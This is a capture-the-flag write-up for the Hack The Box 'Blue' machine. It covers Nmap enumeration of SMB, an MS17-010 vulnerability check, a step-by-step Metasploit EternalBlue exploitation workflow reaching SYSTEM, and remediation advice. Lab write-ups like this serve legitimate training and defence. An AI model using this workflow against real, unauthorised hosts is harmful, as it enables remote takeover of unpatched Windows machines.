HTB Blue — SMB Enumeration and Windows Privilege Escalation
Objective
Enumerate the Windows target's exposed services, assess SMB for the MS17-010 vulnerability, and validate whether the weakness can provide high-privilege access in the authorised HTB lab.
Enumeration
- Tools: Nmap, SMB NSE scripts, Metasploit (for lab validation)
- Relevant services commonly exposed by this machine: SMB over 139/tcp and 445/tcp, plus Windows RPC-related services.
- Useful commands:
  - nmap -p- --open -T4 <TARGET_IP>
  - nmap -sC -sV -p <OPEN_PORTS> <TARGET_IP>
  - nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
- Finding: Service enumeration identifies an older Windows system with SMB exposed. The SMB vulnerability check indicates that the target is vulnerable to MS17-010 (commonly associated with EternalBlue).
Validation and Exploitation
- First validate the vulnerability with the Nmap SMB script or Metasploit's auxiliary/scanner/smb/smb_ms17_010 module.
- In the authorised lab, the known attack path uses Metasploit's exploit/windows/smb/ms17_010_eternalblue module against the target.
- Metasploit workflow:
  - msfconsole
  - use auxiliary/scanner/smb/smb_ms17_010
  - set RHOSTS <TARGET_IP>
  - run
  - If the check confirms exposure, use exploit/windows/smb/ms17_010_eternalblue, set RHOSTS, verify the payload and LHOST are correct for your lab VPN, then run it.
- Validate access with getuid or whoami. The expected high-privilege result on the intended vulnerable instance is NT AUTHORITY\SYSTEM.
- Collect the user and administrator/root-equivalent flags from their locations on the target. Record only flags obtained from your own session.
Security Impact
An unpatched SMBv1 vulnerability can permit remote code execution over the network, potentially resulting in SYSTEM-level compromise without valid user credentials.
Remediation
- Apply Microsoft's MS17-010 security updates and maintain supported Windows versions.
- Disable SMBv1 where it is not required.
- Restrict SMB exposure to trusted networks and block unnecessary access to TCP ports 139 and 445 at network boundaries.
- Monitor SMB traffic, vulnerability-scan results, and endpoint security alerts for exploitation attempts.
Limitations
This test applies to the deliberately vulnerable HTB Blue machine. Exploitability depends on the target's exact OS build, patch level, architecture, and network configuration. Do not test this exploit against systems without explicit authorisation.
